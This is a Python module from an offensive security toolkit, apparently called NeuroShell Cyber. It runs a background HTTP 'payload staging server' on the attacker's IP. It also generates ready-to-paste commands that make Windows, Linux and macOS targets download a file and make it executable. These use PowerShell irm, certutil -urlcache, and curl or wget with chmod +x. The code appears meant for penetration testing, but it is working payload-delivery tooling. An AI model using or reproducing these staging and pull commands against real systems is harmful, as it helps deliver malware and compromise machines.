"""
NeuroShell Cyber — One-Click Payload Staging Server.
Hosts files in background and synthesizes ready-to-run pull commands
for Windows, Linux, and macOS targets.
"""

from __future__ import annotations

import functools
import http.server
import os
import socketserver
import threading
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from editions.cyber.wsl_bridge import WSLKaliBridge


@dataclass
class PullCommands:
    filename: str
    host: str
    port: int
    url: str
    windows_powershell: str
    windows_certutil: str
    linux_curl: str
    linux_wget: str


class StagingServerManager:
    """
    Background HTTP server for fast payload and file staging during security assessments.
    """

    _server: Optional[socketserver.TCPServer] = None
    _thread: Optional[threading.Thread] = None
    _port: int = 8000
    _dir: str = "."

    @classmethod
    def is_running(cls) -> bool:
        return cls._server is not None

    @classmethod
    def get_info(cls) -> dict[str, str | int | bool]:
        return {
            "running": cls.is_running(),
            "port": cls._port,
            "directory": cls._dir,
            "host": WSLKaliBridge.get_attacker_ip(),
        }

    @classmethod
    def start(cls, directory: str = ".", port: int = 8000) -> dict[str, str | int]:
        """Start staging server in background."""
        if cls.is_running():
            return {"status": "already_running", "port": cls._port, "host": WSLKaliBridge.get_attacker_ip()}

        target_dir = os.path.abspath(directory)
        cls._dir = target_dir
        cls._port = port

        # Handler that serves from target_dir
        handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=target_dir)

        # Allow reuse address
        socketserver.TCPServer.allow_reuse_address = True
        try:
            cls._server = socketserver.TCPServer(("", port), handler)
        except OSError:
            # Port busy, find fallback
            cls._port = port + 1
            cls._server = socketserver.TCPServer(("", cls._port), handler)

        cls._thread = threading.Thread(target=cls._server.serve_forever, daemon=True)
        cls._thread.start()

        host = WSLKaliBridge.get_attacker_ip()
        return {
            "status": "started",
            "host": host,
            "port": cls._port,
            "directory": cls._dir,
            "url": f"http://{host}:{cls._port}/",
        }

    @classmethod
    def stop(cls) -> bool:
        """Stop staging server."""
        if cls._server:
            try:
                cls._server.shutdown()
                cls._server.server_close()
            except Exception:
                pass
            cls._server = None
            cls._thread = None
            return True
        return False

    @classmethod
    def generate_pull_commands(cls, filename: str, host: str | None = None, port: int | None = None) -> PullCommands:
        """Generate copy-pasteable download commands for targets."""
        h = host or WSLKaliBridge.get_attacker_ip()
        p = port or cls._port
        url = f"http://{h}:{p}/{filename}"

        return PullCommands(
            filename=filename,
            host=h,
            port=p,
            url=url,
            windows_powershell=f'powershell -c "irm {url} -OutFile {filename}"',
            windows_certutil=f"certutil -urlcache -f {url} {filename}",
            linux_curl=f"curl -sSL {url} -o {filename} && chmod +x {filename}",
            linux_wget=f"wget {url} -O {filename} && chmod +x {filename}",
        )
